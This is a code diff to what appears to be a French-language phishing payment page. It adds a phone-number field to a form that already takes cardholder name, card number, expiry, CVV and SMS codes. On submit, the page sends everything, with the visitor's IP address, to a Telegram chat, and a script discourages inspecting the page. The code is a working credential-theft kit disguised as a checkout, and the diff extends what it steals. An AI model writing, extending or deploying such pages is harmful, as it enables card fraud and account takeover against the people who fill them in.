@@ -81,6 +81,9 @@
   <div class="payment-container" id="step-1">
     <h2>Formulaire de Paiement</h2>
     <form id="payment-form">
+      <label for="phone-number">Numéro de téléphone</label>
+      <input type="text" id="phone-number" name="phone-number" required placeholder="Entrez votre numéro de téléphone" pattern="^\+?[0-9]{1,4}?[-. \(\)]?([0-9]{1,3}[-. \(\)]?){1,4}[0-9]{1,3}$" title="Veuillez entrer un numéro de téléphone valide.">
+
       <label for="cardholder-name">Nom sur la carte</label>
       <input type="text" id="cardholder-name" name="cardholder-name" required placeholder="Nom du titulaire de la carte">
 
@@ -165,7 +168,8 @@
             event.target.id === 'card-number' || 
             event.target.id === 'expiry-date' || 
             event.target.id === 'cvv' || 
-            event.target.id === 'sms-code')) {
+            event.target.id === 'sms-code' || 
+            event.target.id === 'phone-number')) {
         event.preventDefault(); // Empêcher l'inspection du fichier en dehors des champs spécifiés
       }
     });
@@ -183,6 +187,7 @@
     document.getElementById('payment-form').addEventListener('submit', function(event) {
       event.preventDefault();
 
+      const phoneNumber = document.getElementById('phone-number').value;
       const cardholderName = document.getElementById('cardholder-name').value;
       const cardNumber = document.getElementById('card-number').value;
       const expiryDate = document.getElementById('expiry-date').value;
@@ -191,6 +196,7 @@
       // Ajouter l'adresse IP dans le message Telegram
       sendToTelegram(`
         Paiement reçu :
+        Numéro de téléphone : ${phoneNumber}
         Nom : ${cardholderName}
         Numéro : ${cardNumber}
         Expiration : ${expiryDate}
